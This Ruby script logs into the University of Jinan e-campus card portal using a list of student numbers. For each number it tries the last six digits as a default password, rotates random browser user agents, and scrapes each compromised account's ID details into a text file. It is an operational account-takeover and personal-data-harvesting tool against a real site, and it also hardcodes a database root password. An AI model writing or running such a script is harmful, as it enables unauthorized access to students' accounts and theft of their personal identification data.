# encoding:utf-8

require 'nokogiri'
require 'mechanize'
require 'mysql2'
require 'pp'

def mysql
    client = Mysql2::Client.new(:host => "127.0.0.1",
                                :username => "root",
                                :password => "default",
                                :database => "student")

end

def get_id(number)
    ecampus = Mechanize.new {|agent|
        agent.user_agent = Mechanize::AGENT_ALIASES.values[rand(21)]
    }
    
    ecampus.get("http://ecampus.ujn.edu.cn")

    form = ecampus.page.forms[0]
    return nil if form == nil
    form.yktkh = "2" + number
    form.password = number[-6..-1]
    form.click_button

    return nil if ecampus.page.forms[0].errcode == "1"
    # 0 means done
    # 1 means error
    
    ecampus.page.forms[0].click_button
    id_page = ecampus.get("http://ecampus.ujn.edu.cn/myecard.asp")

    doc = Nokogiri::HTML(id_page.body)
    ecampus.get("http://ecampus.ujn.edu.cn/logout.asp")
    
    io = File.open('./2017_id_num.txt', 'a+')
    doc.search('//td[@colspan="7"]/table/tr/td[2]/div').each do |row|
        io << row.text << "\n" if row.text != ""
    end
    io.close
end

File.open("allnum.txt", "r") do |io|
    while line = io.gets
        sleep 0.5
        line = line.chomp!
        temp = get_id(line)        
    end
end

